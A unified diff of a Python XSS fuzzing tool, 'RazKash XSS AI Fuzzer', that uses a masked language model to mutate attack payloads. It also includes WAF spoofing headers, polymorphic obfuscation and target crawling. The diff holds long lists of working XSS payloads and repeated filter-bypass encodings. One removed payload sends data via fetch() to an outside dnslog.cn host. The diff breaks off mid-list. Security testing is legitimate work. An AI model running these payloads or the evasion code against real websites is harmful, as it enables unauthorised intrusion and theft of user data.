@@ -1,6 +1,7 @@
 #!/usr/bin/env python3
 # =============================================================================
-# RazKash 𝕏SS AI Fuzzer (v9.1-omni-enterprise, 2025-05-04)
+# RazKash 𝕏SS AI Fuzzer · (Red Team + SOC Version)  
+# Version: 2025-05-10, v9.2 Enterprise
 # Author : Haroon Ahmad Awan · CyberZeus (mrharoonawan@gmail.com)
 # =============================================================================
 
@@ -18,6 +19,7 @@ import logging
 import base64
 import threading
 import contextlib
+import codecs
 import xml.etree.ElementTree as ET
 from pathlib import Path
 from typing import List, Dict, Any
@@ -33,59 +35,79 @@ from fake_useragent import UserAgent
 import torch
 from transformers import AutoTokenizer, AutoModelForMaskedLM, logging as hf_log
 
-# Optional Playwright & websocket-client
+# Optional: Playwright & websocket
 try:
-    from playwright.sync_api import sync_playwright, Request as PWReq, WebSocket as PWWS, Response as PWResp, Page
+    from playwright.sync_api import sync_playwright, Request as PWReq
 except ImportError:
     sync_playwright = None
+
 try:
     import websocket
 except ImportError:
     websocket = None
 
-# ─── CONFIG ────────────────────────────────────────────────────────────────
-VER              = "9.1-omni-enterprise"
-MODEL            = "microsoft/codebert-base"
-DNSLOG_DOMAIN    = "ugxllx.dnslog.cn"
-LOGFILE          = Path("razkash_findings.md")
+# ─────────────────────────────────────────────────────────────────────────────
+#                              CONFIG
+# ─────────────────────────────────────────────────────────────────────────────
 
-TOP_K            = 7
-DEF_THREADS      = 16
-MAX_STATIC_PAGES = 300
-MAX_NESTED_DEPTH = 5
-SPA_WAIT_MS      = 2000
-DYN_OBS_MS       = 20000
-RESCAN_MS        = 600
-MAX_DYN_ROUNDS   = 80
-HTTP_TIMEOUT     = 12
-VERIFY_TIMEOUT   = 9000
-HEADLESS_WAIT    = 3500
+VER               = "9.2-omni-enterprise (2025-05-10, merged build)"
+MODEL             = "microsoft/codebert-base"
+DNSLOG_DOMAIN     = "ugxllx.dnslog.cn"
+LOGFILE           = Path("razkash_findings.md")
 
-# ─── ARGS & LOGGING ────────────────────────────────────────────────────────
-ap = argparse.ArgumentParser(
-    description="RazKash v9.1-omni-enterprise · Ultimate AI XSS Omnifuzzer"
-)
-ap.add_argument("-u", "--url",         help="Target root URL")
-ap.add_argument("--autotest",          action="store_true", help="Run built-in vulnerable labs")
-ap.add_argument("--login-url",         help="URL to submit login credentials")
-ap.add_argument("--username",          help="Username for login")
-ap.add_argument("--password",          help="Password for login")
-ap.add_argument("--csrf-field",        default="csrf", help="CSRF form field name")
-ap.add_argument("--threads",           type=int, default=DEF_THREADS)
-ap.add_argument("--max-pages",         type=int, default=MAX_STATIC_PAGES)
-ap.add_argument("--nested-depth",      type=int, default=MAX_NESTED_DEPTH)
-ap.add_argument("--simulate-spa",      action="store_true", help="Click internal SPA links")
-ap.add_argument("--crawl-iframes",     action="store_true", help="Enter iframes and nested pages")
-ap.add_argument("--detect-waf",        action="store_true", help="Enable passive WAF fingerprinting")
-ap.add_argument("--polymorph",         action="store_true", help="Enable polymorphic traffic")
-ap.add_argument("--headed",            action="store_true", help="Launch browser non-headless to view alerts")
-ap.add_argument("--debug",             action="store_true", help="Enable debug logging")
+TOP_K             = 7
+DEF_THREADS       = 16
+MAX_STATIC_PAGES  = 300
+MAX_NESTED_DEPTH  = 5
+
+RATE_LIMIT_SLEEP  = 0.05
+SESSION_SPLICE_MS = 100
+JITTER_MIN_MS     = 20
+JITTER_MAX_MS     = 200
+
+VERIFY_TIMEOUT    = 9000
+HTTP_TIMEOUT      = 12
+HEADLESS_WAIT     = 3500
+
+WAF_SPOOF_HEADERS = [
+    {"User-Agent": "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"},
+    {"User-Agent": "curl/7.68.0"},
+    {"User-Agent": "Wget/1.20.3 (linux-gnu)"},
+    {"X-Forwarded-For": "127.0.0.1"},
+    {"X-Client-IP": "127.0.0.1"},
+]
+
+# ─────────────────────────────────────────────────────────────────────────────
+#                              ARGUMENTS
+# ─────────────────────────────────────────────────────────────────────────────
+
+ap = argparse.ArgumentParser(description="RazKash v9.2-omni-enterprise · Ultimate AI XSS Omnifuzzer")
+mx = ap.add_mutually_exclusive_group()
+mx.add_argument("--reflected", action="store_true", help="Only reflected XSS")
+mx.add_argument("--stored",    action="store_true", help="Only stored XSS")
+mx.add_argument("--blind",     action="store_true", help="Only blind XSS")
+mx.add_argument("--invent",    action="store_true", help="Invent new AI-driven payloads (add 'MASK' placeholder)")
+ap.add_argument("-u","--url",      help="Target root URL")
+ap.add_argument("--autotest",      action="store_true", help="Use built-in vulnerable labs for quick testing")
+ap.add_argument("--login-url",     help="Optional login endpoint URL")
+ap.add_argument("--username",      help="Optional username for login")
+ap.add_argument("--password",      help="Optional password for login")
+ap.add_argument("--csrf-field",    default="csrf", help="CSRF field name (for form-based login)")
+ap.add_argument("--threads",       type=int, default=DEF_THREADS, help="Number of fuzzing threads")
+ap.add_argument("--max-pages",     type=int, default=MAX_STATIC_PAGES, help="Max static pages to crawl")
+ap.add_argument("--nested-depth",  type=int, default=MAX_NESTED_DEPTH, help="Max depth for nested iframes")
+ap.add_argument("--simulate-spa",  action="store_true", help="Simulate SPA by clicking links (Playwright)")
+ap.add_argument("--crawl-iframes", action="store_true", help="Crawl iframes as well")
+ap.add_argument("--detect-waf",    action="store_true", help="Enable passive WAF detection attempt")
+ap.add_argument("--polymorph",     action="store_true", help="Obfuscate payloads with random transformations")
+ap.add_argument("--headed",        action="store_true", help="Run Playwright in headed mode for XSS popups")
+ap.add_argument("--debug",         action="store_true", help="Enable debug logging")
 args = ap.parse_args()
 DEBUG = args.debug
 
 logging.basicConfig(
     level=logging.DEBUG if DEBUG else logging.INFO,
-    format="%(asctime)s %(levelname)s: %(message)s" if DEBUG else "%(message)s"
+    format="%(asctime)s %(levelname)s: %(message)s"
 )
 warnings.filterwarnings("ignore")
 hf_log.set_verbosity_error()
@@ -96,354 +118,338 @@ def dbg(msg: str):
     if DEBUG:
         logging.debug(msg)
 
-# ─── UTILITIES ─────────────────────────────────────────────────────────────
-randstr = lambda n=12: ''.join(random.choices(string.ascii_letters+string.digits, k=n))
-def jitter(a: float, b: float):
-    time.sleep(random.uniform(a, b))
+# ─────────────────────────────────────────────────────────────────────────────
+#                              UTILITIES
+# ─────────────────────────────────────────────────────────────────────────────
 
-def smart_url(raw: str) -> str:
-    if raw.startswith(("http://","https://")):
-        return raw
-    for s in ("https://","http://"):
-        with contextlib.suppress(Exception):
-            r = requests.head(s+raw, timeout=5, allow_redirects=True, verify=False)
-            if r.status_code < 500:
-                return s+raw
-    return "http://"+raw
+def randstr(n=12):
+    return ''.join(random.choices(string.ascii_letters + string.digits, k=n))
 
-def random_headers() -> Dict[str, str]:
+def jitter(a=JITTER_MIN_MS, b=JITTER_MAX_MS):
+    time.sleep(random.uniform(a/1000, b/1000))
+
+def session_splice():
+    time.sleep(SESSION_SPLICE_MS/1000)
+
+def rate_limit():
+    time.sleep(RATE_LIMIT_SLEEP)
+
+def smart_url(u: str) -> str:
+    if u.startswith(("http://","https://")):
+        return u
+    for p in ("https://","http://"):
+        try:
+            if requests.head(p+u, timeout=3, verify=False).status_code < 500:
+                return p+u
+        except:
+            pass
+    return "http://" + u
+
+def random_headers() -> Dict[str,str]:
     ua = UserAgent()
-    h = {
-        "User-Agent": ua.random,
-        "Accept": "*/*",
-        "Accept-Language": "en-US,en;q=0.9",
-        "Accept-Encoding": "gzip, deflate",
-        "Connection": "keep-alive"
-    }
-    if args.polymorph:
-        h = dict(sorted(h.items(), key=lambda _: random.random()))
-        h["X-Random"] = randstr(8)
+    h = {"User-Agent": ua.random}
+    if args.detect_waf:
+        h.update(random.choice(WAF_SPOOF_HEADERS))
     return h
 
-INTROSPECTION = """
-query IntrospectionQuery {
-  __schema {
-    queryType { name }
-    mutationType { name }
-    types {
-      kind name fields {
-        name args { name type { kind name ofType { name kind } } }
-      }
-    }
-  }
-}
-"""
+# ─────────────────────────────────────────────────────────────────────────────
+#                         AI MODEL (MASK FILLING)
+# ─────────────────────────────────────────────────────────────────────────────
 
-def discover_graphql_ops(endpoint):
-    resp = SESSION.post(endpoint, json={"query": INTROSPECTION}, timeout=HTTP_TIMEOUT, verify=False)
-    schema = resp.json()["data"]["__schema"]
-    ops = []
-    for kind in ("queryType","mutationType"):
-        root = schema.get(kind)
-        if not root: continue
-        for t in schema["types"]:
-            if t["name"] == root["name"]:
-                for f in t["fields"]:
-                    string_args = [arg["name"] for arg in f["args"]
-                                   if arg["type"]["kind"]=="SCALAR" and arg["type"]["name"]=="String"]
-                    if string_args:
-                        ops.append((f["name"], string_args))
-    return ops
-
-def fuzz_graphql(endpoint):
-    for name, args in discover_graphql_ops(endpoint):
-        for arg in args:
-            payload = "<img src=x onerror=alert(1)>"
-            query = f"mutation{{{name}({arg}:\"{payload}\"){{__typename}}}}"
-            SESSION.post(endpoint, json={"query": query}, timeout=HTTP_TIMEOUT, verify=False)
-
-
-# ─── AUTHENTICATION / SESSION ──────────────────────────────────────────────
-def get_authenticated_session() -> requests.Session:
-    sess = requests.Session()
-    if args.login_url and args.username and args.password:
-        # detect Juice Shop REST login endpoint
-        if args.login_url.rstrip("/").endswith("/rest/user/login"):
-            headers = random_headers()
-            headers["Content-Type"] = "application/json"
-            resp = sess.post(
-                args.login_url,
-                json={"email": args.username, "password": args.password},
-                headers=headers,
-                verify=False,
-                timeout=HTTP_TIMEOUT
-            )
-            dbg(f"[login] status={resp.status_code} body={resp.text}")
-            try:
-                j = resp.json()
-                token = j.get("authentication", {}).get("token") or j.get("token")
-                if token:
-                    sess.headers.update({"Authorization": f"Bearer {token}"})
-                    dbg(f"[login] using token={token[:8]}…")
-            except Exception as e:
-                dbg(f"[login] token parse error: {e}")
-        else:
-            # fallback to form-based login
-            r = sess.get(args.login_url, headers=random_headers(), verify=False, timeout=HTTP_TIMEOUT)
-            data = {}
-            if args.csrf_field in r.text:
-                m = re.search(f'name=\"{args.csrf_field}\" value=\"([^\"]+)\"', r.text)
-                if m:
-                    data[args.csrf_field] = m.group(1)
-            data.update({"username": args.username, "password": args.password})
-            sess.post(
-                args.login_url,
-                data=data,
-                headers=random_headers(),
-                verify=False,
-                timeout=HTTP_TIMEOUT
-            )
-            dbg(f"[login] session cookies: {sess.cookies.get_dict()}")
-    return sess
-
-# create session and mount adapter to enlarge pool
-SESSION = get_authenticated_session()
-adapter = HTTPAdapter(pool_connections=50, pool_maxsize=50)
-SESSION.mount("https://", adapter)
-SESSION.mount("http://", adapter)
-
-
-# ─── AI MUTATION & POLYMORPH ────────────────────────────────────────────────
 device = torch.device("cuda" if torch.cuda.is_available() else "cpu")
 tok    = AutoTokenizer.from_pretrained(MODEL)
 mdl    = AutoModelForMaskedLM.from_pretrained(MODEL).to(device).eval()
 MASK_T, MASK_ID = tok.mask_token, tok.mask_token_id
 
-def ai_mutate(s: str) -> str:
+def ai_mutate(template: str) -> str:
+    s = template
     while "MASK" in s:
         ids = tok(s.replace("MASK", MASK_T, 1), return_tensors="pt").input_ids.to(device)
         with torch.no_grad():
-            logits = mdl(input_ids=ids).logits
+            logits = mdl(ids).logits
         pos = (ids == MASK_ID).nonzero(as_tuple=True)[1][0]
-        token_id = random.choice(logits[0, pos].topk(TOP_K).indices.tolist())
+        token_id = random.choice(logits[0,pos].topk(TOP_K).indices.tolist())
         w = tok.decode(token_id).strip() or "alert(1)"
         s = s.replace("MASK", w, 1)
     return s
 
-def polymorph(s: str) -> str:
-    typ = random.choice(["hex","uni","url","b64","comment","bidi","none"])
-    if typ == "hex":
-        return ''.join(f"\\x{ord(c):02x}" for c in s)
-    if typ == "uni":
-        return ''.join(f"\\u{ord(c):04x}" for c in s)
-    if typ == "url":
-        return urllib.parse.quote(s)
-    if typ == "b64":
-        return base64.b64encode(s.encode()).decode()
-    if typ == "comment":
-        return ''.join(f"{c}/**/" for c in s)
-    if typ == "bidi":
-        return "\u202E" + s[::-1]
-    return s
+# ─────────────────────────────────────────────────────────────────────────────
+#                       POLYMORPHIC OBFUSCATION
+# ─────────────────────────────────────────────────────────────────────────────
 
-def legit_wrap(s: str) -> str:
-    wrappers = [
-        "<div hidden>PAYLOAD</div>",
-        "<span style=display:none>PAYLOAD</span>",
-        "<p data-x=PAYLOAD></p>",
-        "<video srcdoc='<script>PAYLOAD</script>'></video>",
-        "<template id=tpl>PAYLOAD</template><script>document.body.append(tpl.content)</script>",
-        "<noscript><style>*{background:url(javascript:PAYLOAD)}</style></noscript>"
-    ]
-    return random.choice(wrappers).replace("PAYLOAD", s)
-
-def reflected(marker: str, html: str) -> bool:
-    low = html.lower()
-    return marker.lower() in low or SequenceMatcher(None, marker.lower(), low).quick_ratio() > 0.8
-
-# ─── PAYLOAD & FILTER SETS ─────────────────────────────────────────────────
-PAY = [
-    "<script>MASK</script>",
-    "<img src=x onerror='MASK'>",
-    "<svg><script>MASK</script></svg>",
-    "<iframe srcdoc='<script>MASK</script>'></iframe>",
-    "<body onload=MASK>",
-    "<details ontoggle=MASK>",
-    '{"@context":"http://schema.org","@type":"Person","name":"MASK"}',
-    '{"@context":"http://schema.org","@type":"Product","description":"MASK"}',
-    "<span property='schema:name'>MASK</span>",
-    "<div typeof='schema:Product' about='#x'><span property='description'>MASK</span></div>",
-    "<meta property='og:title' content='MASK'>",
-    "<script>trustedTypes.createPolicy('x',{createHTML:s=>s}).createHTML('MASK')</script>",
-    "<meta http-equiv='Content-Security-Policy' content=\"script-src 'self' 'nonce-MASK'\"><script nonce='MASK'>MASK</script>",
-    "/**/<script>MASK</script>/**/",
-    "<!--<script>--><script>MASK</script>//-->",
-    "<div><p><style><img src=x onerror=MASK>",
-    "{{constructor.constructor('MASK')()}}",
-    "{{#with 's' as |x|}}{{x.constructor('MASK')()}}{{/with}}",
-    "<div v-html=\"MASK\"></div>",
-    "<component :is=\"'script'\" src='x.js'></component>",
-    "<script>WebAssembly.instantiateStreaming(fetch('data:application/wasm;base64,MASK'))</script>",
-    "<script>navigator.serviceWorker.register('sw.js?x=MASK')</script>",
-    "<script>navigator.gpu.requestAdapter().then(a=>MASK)</script>",
-    "<script>new BroadcastChannel('x').postMessage('MASK')</script>",
-    "<script>new EventSource('/stream?x=MASK')</script>",
-    "<script>caches.open('x').then(c=>c.put('/pwned',new Response('<script>MASK</script>')))</script>",
-    "\ufeff\u202Egpj.sj//:ptth<script>MASK</script>",
-    "<script>__proto__.x=MASK</script>",
-    "<script>Object.defineProperty({},'__proto__',{value:{innerHTML:'<img src onerror=MASK>'}})</script>"
-]
-if DNSLOG_DOMAIN:
-    PAY.append(f"<img src onerror=fetch('http://{DNSLOG_DOMAIN}/?p='+btoa('MASK'))>")
-
-FILTER = [
-    'javascript:alert(1)',
-    '\x6a\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3a\x61\x6c\x65\x72\x74\x28\x31\x29',
-    '\u006a\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003a\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029',
-    'amF2YXNjcmlwdDphbGVydCgxKQ==',
-    '%6A%61%76%61%73%63%72%69%70%74%3A%61%6C%65%72%74%28%31%29',
-    '&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;',
-    'javascript%3Aalert%281%29',
-    'javascript%253Aalert%25281%2529',
-    '%u006A%u0061%u0076%u0061%u0073%u0063%u0072%u0069%u0070%u0074%u003A%u0061%u006C%u0065%u0072%u0074%u0028%u0031%u0029',
-    '&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;',
-    ')1(trela:tpircsavaj',
-    'JAVASCRIPT:ALERT(1)',
-    'javascript:alert(1)',
-    'JAVASCRIPT:ALERT(1)',
-    '\j\a\v\a\s\c\r\i\p\t\:\a\l\e\r\t\(\1\)',
-    'amF2YXNjcmlwdDphbGVydCgxKQ==',
-    'amF2YXNjcmlwdDphbGVydCgxKQ',
-    '\x6a\x6a\x61\x61\x76\x76\x61\x61\x73\x73\x63\x63\x72\x72\x69\x69\x70\x70\x74\x74\x3a\x3a\x61\x61\x6c\x6c\x65\x65\x72\x72\x74\x74\x28\x28\x31\x31\x29\x29',
-    '%U0000006A%U00000061%U00000076%U00000061%U00000073%U00000063%U00000072%U00000069%U00000070%U00000074%U0000003A%U00000061%U0000006C%U00000065%U00000072%U00000074%U00000028%U00000031%U00000029',
-    '%x0000006A%x00000061%x00000076%x00000061%x00000073%x00000063%x00000072%x00000069%x00000070%x00000074%x0000003A%x00000061%x0000006C%x00000065%x00000072%x00000074%x00000028%x00000031%x00000029',
-    'javascript:alert(I)',
-    'javascript:alert(1)',
-    '\x6a\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3a\x61\x6c\x65\x72\x74\x28\x31\x29',
-    '\u006a\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003a\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029',
-    'amF2YXNjcmlwdDphbGVydCgxKQ==',
-    '%6A%61%76%61%73%63%72%69%70%74%3A%61%6C%65%72%74%28%31%29',
-    '&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;',
-    'javascript%3Aalert%281%29',
-    'javascript%253Aalert%25281%2529',
-    '%u006A%u0061%u0076%u0061%u0073%u0063%u0072%u0069%u0070%u0074%u003A%u0061%u006C%u0065%u0072%u0074%u0028%u0031%u0029',
-    '&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;',
-    ')1(trela:tpircsavaj',
-    'JAVASCRIPT:ALERT(1)',
-    'javascript:alert(1)',
-    'JAVASCRIPT:ALERT(1)',
-    '\j\a\v\a\s\c\r\i\p\t\:\a\l\e\r\t\(\1\)',
-    'amF2YXNjcmlwdDphbGVydCgxKQ==',
-    'amF2YXNjcmlwdDphbGVydCgxKQ',
-    '\x6a\x6a\x61\x61\x76\x76\x61\x61\x73\x73\x63\x63\x72\x72\x69\x69\x70\x70\x74\x74\x3a\x3a\x61\x61\x6c\x6c\x65\x65\x72\x72\x74\x74\x28\x28\x31\x31\x29\x29',
-    '%U0000006A%U00000061%U00000076%U00000061%U00000073%U00000063%U00000072%U00000069%U00000070%U00000074%U0000003A%U00000061%U0000006C%U00000065%U00000072%U00000074%U00000028%U00000031%U00000029',
-    '%x0000006A%x00000061%x00000076%x00000061%x00000073%x00000063%x00000072%x00000069%x00000070%x00000074%x0000003A%x00000061%x0000006C%x00000065%x00000072%x00000074%x00000028%x00000031%x00000029',
-    'javascript:alert(I)',
-    'javascript:alert(1)',
-    '\x6a\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3a\x61\x6c\x65\x72\x74\x28\x31\x29',
-    '\u006a\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003a\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029',
-    'amF2YXNjcmlwdDphbGVydCgxKQ==',
-    '%6A%61%76%61%73%63%72%69%70%74%3A%61%6C%65%72%74%28%31%29',
-    '&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;',
-    'javascript%3Aalert%281%29',
-    'javascript%253Aalert%25281%2529',
-    '%u006A%u0061%u0076%u0061%u0073%u0063%u0072%u0069%u0070%u0074%u003A%u0061%u006C%u0065%u0072%u0074%u0028%u0031%u0029',
-    '&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;',
-    ')1(trela:tpircsavaj',
-    'JAVASCRIPT:ALERT(1)',
-    'javascript:alert(1)',
-    'JAVASCRIPT:ALERT(1)',
-    '\j\a\v\a\s\c\r\i\p\t\:\a\l\e\r\t\(\1\)',
-    'amF2YXNjcmlwdDphbGVydCgxKQ==',
-    'amF2YXNjcmlwdDphbGVydCgxKQ',
-    '\x6a\x6a\x61\x61\x76\x76\x61\x61\x73\x73\x63\x63\x72\x72\x69\x69\x70\x70\x74\x74\x3a\x3a\x61\x61\x6c\x6c\x65\x65\x72\x72\x74\x74\x28\x28\x31\x31\x29\x29',
-    '%U0000006A%U00000061%U00000076%U00000061%U00000073%U00000063%U00000072%U00000069%U00000070%U00000074%U0000003A%U00000061%U0000006C%U00000065%U00000072%U00000074%U00000028%U00000031%U00000029',
-    '%x0000006A%x00000061%x00000076%x00000061%x00000073%x00000063%x00000072%x00000069%x00000070%x00000074%x0000003A%x00000061%x0000006C%x00000065%x00000072%x00000074%x00000028%x00000031%x00000029',
-    'javascript:alert(I)',
-    'javascript:alert(1)',
-    '\x6a\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3a\x61\x6c\x65\x72\x74\x28\x31\x29',
-    '\u006a\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003a\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029',
-    'amF2YXNjcmlwdDphbGVydCgxKQ==',
-    '%6A%61%76%61%73%63%72%69%70%74%3A%61%6C%65%72%74%28%31%29',
-    '&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;',
-    'javascript%3Aalert%281%29',
-    'javascript%253Aalert%25281%2529',
-    '%u006A%u0061%u0076%u0061%u0073%u0063%u0072%u0069%u0070%u0074%u003A%u0061%u006C%u0065%u0072%u0074%u0028%u0031%u0029',
-    '&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;',
-    ')1(trela:tpircsavaj',
-    'JAVASCRIPT:ALERT(1)',
-    'javascript:alert(1)',
-    'JAVASCRIPT:ALERT(1)',
-    '\j\a\v\a\s\c\r\i\p\t\:\a\l\e\r\t\(\1\)',
-    'amF2YXNjcmlwdDphbGVydCgxKQ==',
-    'amF2YXNjcmlwdDphbGVydCgxKQ',
-    '\x6a\x6a\x61\x61\x76\x76\x61\x61\x73\x73\x63\x63\x72\x72\x69\x69\x70\x70\x74\x74\x3a\x3a\x61\x61\x6c\x6c\x65\x65\x72\x72\x74\x74\x28\x28\x31\x31\x29\x29',
-    '%U0000006A%U00000061%U00000076%U00000061%U00000073%U00000063%U00000072%U00000069%U00000070%U00000074%U0000003A%U00000061%U0000006C%U00000065%U00000072%U00000074%U00000028%U00000031%U00000029',
-    '%x0000006A%x00000061%x00000076%x00000061%x00000073%x00000063%x00000072%x00000069%x00000070%x00000074%x0000003A%x00000061%x0000006C%x00000065%x00000072%x00000074%x00000028%x00000031%x00000029',
-    'javascript:alert(I)',
-    'javascript:alert(1)',
-    '\x6a\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3a\x61\x6c\x65\x72\x74\x28\x31\x29',
-    '\u006a\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003a\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029',
-    'amF2YXNjcmlwdDphbGVydCgxKQ==',
-    '%6A%61%76%61%73%63%72%69%70%74%3A%61%6C%65%72%74%28%31%29',
-    '&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;',
-    'javascript%3Aalert%281%29',
-    'javascript%253Aalert%25281%2529',
-    '%u006A%u0061%u0076%u0061%u0073%u0063%u0072%u0069%u0070%u0074%u003A%u0061%u006C%u0065%u0072%u0074%u0028%u0031%u0029',
-    '&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;',
-    ')1(trela:tpircsavaj',
-    'JAVASCRIPT:ALERT(1)',
-    'javascript:alert(1)',
-    'JAVASCRIPT:ALERT(1)',
-    '\j\a\v\a\s\c\r\i\p\t\:\a\l\e\r\t\(\1\)',
-    'amF2YXNjcmlwdDphbGVydCgxKQ==',
+obfuscation_methods = [
+    lambda p: p,
+    lambda p: "".join(f"\\x{ord(c):02x}" for c in p) if p else p,
+    lambda p: "".join(f"\\u{ord(c):04x}" for c in p) if p else p,
+    lambda p: base64.b64encode(p.encode()).decode(errors='ignore') if p else p,
+    lambda p: p.encode('utf-16').decode(errors='ignore') if p else p,
+    lambda p: codecs.encode(p, 'rot_13') if p else p,
+    lambda p: urllib.parse.quote(p) if p else p,
+    lambda p: p.replace('<','&lt;').replace('>','&gt;') if p else p,
+    lambda p: p.replace('"','&quot;').replace("'",'&#39;') if p else p,
+    lambda p: "".join(f"\\{c}" for c in p) if p else p,
+    lambda p: "".join(f"%{ord(c):02X}" for c in p) if p else p,
+    lambda p: "".join(f"&#x{ord(c):X};" for c in p) if p else p,
+    lambda p: "".join(f"&#{ord(c)};" for c in p) if p else p,
+    lambda p: "".join(f"{c}/**/" for c in p) if p else p,
+    lambda p: p[::-1] if p else p,
+    lambda p: p.upper() if p else p,
+    lambda p: p.lower() if p else p,
+    lambda p: p.swapcase() if p else p,
+    lambda p: p.replace('\x00','') if p else p,
 ]
 
+def polymorph(payload: str) -> str:
+    return random.choice(obfuscation_methods)(payload)
 
-# ─── JSFLAG: In-browser sink tracer ─────────────────────────────────────────
-JSFLAG = """
-window._xss_triggered=false;function _f(){window._xss_triggered=true;}
-['innerHTML','outerHTML','insertAdjacentHTML','appendChild','after','before'].forEach(p=>{
- const d=Object.getOwnPropertyDescriptor(Element.prototype,p)||{};
- if(d.set){Object.defineProperty(Element.prototype,p,{set(v){_f();d.set.call(this,v)},configurable:true});}
-});
-const _eval=window.eval;window.eval=function(...a){_f();return _eval(...a)};
-const _F=Function;window.Function=function(...a){_f();return new _F(...a)};
-MutationObserver.prototype.observe=new Proxy(MutationObserver.prototype.observe,{
- apply(t,s,a){_f();return Reflect.apply(t,s,a);}
-});
-"""
+# ─────────────────────────────────────────────────────────────────────────────
+#                     BASE XSS PAYLOADS + INVENT OPTION
+# ─────────────────────────────────────────────────────────────────────────────
 
-# ─── WAF DETECTION & EVASION ───────────────────────────────────────────────
-def detect_waf(url: str) -> str:
-    sigs = {
-        "cloudflare":   ["__cf_bm","Attention Required!","Cloudflare Ray ID","cf-ray","cf-cache-status"],
-        "akamai":       ["akamai","AKAMAI","akamaiedge","AkamaiGHost","EdgePrerender"],
-        "imperva":      ["incapsula","X-Iinfo","visid_incap_","incap_ses_"],
-        "sucuri":       ["Access Denied - Sucuri","sucuri_cloudproxy_uuid","CloudProxy-Signature"],
-        "mod_security": ["Mod_Security","mod_security","OWASP_CRS","SecRuleEngine"],
-        "aws_waf":      ["AWSALB","AmazonALB","X-Amzn-RequestId","X-Amzn-Debug"],
-        # ... add your other 50+ providers here using the same pattern ...
-    }
+stored_payloads = [
+    # 1–10: Simple <script> and common payloads
+    '<script>alert(1)</script>',
+    "<script>alert('XSS')</script>",
+    '"><script>alert(document.domain)</script>',
+    '<SCRIPT SRC=//example.com/xss.js></SCRIPT>',
+    "<script>confirm('XSS')</script>",
+    '<SCRIPT>alert("XSS");</SCRIPT>',
+    "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
+    "<script>console.log('XSS');alert('XSS');</script>",
+    '<script type="text/javascript">alert(/XSS/)</script>',
+    "';alert('XSS');//",
+
+    # 11–20: Image / Event Handler
+    "<img src=x onerror=alert('XSS')>",
+    "<img src=1 onerror=alert(/XSS/)>",
+    '"><img src=x onerror=alert(\'XSS\')>',
+    "<img src=\"javascript:alert('XSS')\">",
+    "<img src=\"invalid\" onerror=\"alert('XSS')\">",
+    '<IMG LOWSRC="javascript:alert(\'XSS\')">',
+    "<img src=javascript:alert('XSS')>",
+    "<img src=1 onload=alert(1)>",
+    '"><img src=doesnotexist onerror=confirm(\'XSS\')>',
+    "<img src=data: onerror=alert('XSS')>",
+
+    # 21–30: Anchor / javascript: Schemes
+    "<a href=\"javascript:alert('XSS')\">Click Me</a>",
+    '"><a href="javascript:alert(/XSS/)">link</a>',
+    "<a href=javascript:alert('XSS')>XSS Link</a>",
+    "<a href=JaVaScRiPt:alert('XSS')>mixed-case link</a>",
+    "<a href=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg>Base64Load</a>",
+    "<a href=javascript:console.log('XSS');alert('XSS')>Debug+Alert</a>",
+    "<a href=\"ja    vascript:alert('XSS')\">whitespace trick</a>",
+    "<a href=\"javascript:eval('alert(XSS)')\">eval link</a>",
+    "<a href=\"javascript:prompt('Stored XSS')\">Prompt link</a>",
+    "\"><a href=javascript:alert('XSS') style=position:absolute;top:0;left:0>Overlay</a>",
+
+    # 31–40: Iframe / Form / Body
+    "<iframe src=\"javascript:alert('XSS')\"></iframe>",
+    "<iframe srcdoc=\"<script>alert('XSS')</script>\"></iframe>",
+    "<form action=\"javascript:alert('XSS')\"><input type=submit></form>",
+    "<body onload=alert('XSS')>",
+    "<body background=javascript:alert('XSS')>",
+    "<form><button formaction=\"javascript:alert('XSS')\">XSS</button></form>",
+    "\"><iframe src=javascript:alert(1)>",
+    "<iframe/onload=alert('XSS')>",
+    "<form action=\"\" onsubmit=alert(\"XSS\")><input type=submit value=\"Go\"></form>",
+    "<BODY ONRESIZE=alert(\"XSS\")>resize me</BODY>",
+
